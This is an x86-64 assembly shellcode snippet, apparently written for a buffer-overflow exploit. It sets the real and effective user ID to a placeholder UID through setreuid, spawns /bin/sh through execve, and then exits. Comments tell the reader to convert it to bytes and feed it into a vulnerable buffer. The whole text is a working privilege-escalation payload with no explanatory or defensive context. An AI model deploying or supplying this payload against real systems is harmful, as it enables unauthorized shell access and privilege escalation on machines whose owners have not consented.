xor    rdi,rdi
xor    rax,rax		
xor    rsi, rsi 
mov    si, UID #change me with the user ID 
mov    di, UID #change me	with the user ID
mov    al,0x71	  
syscall		
xor    rdx,rdx
movabs rbx,0x68732f6e69622fff
shr    rbx,0x8
push   rbx
mov    rdi,rsp
xor    rax,rax
push   rax
push   rdi
mov    rsi,rsp
mov    al,0x3b
syscall
push   0x1
pop    rdi
push   0x3c
pop    rax
syscall

# convert to bytes and pass to buffer
# converter https://defuse.ca/online-x86-assembler.htm#disassembly
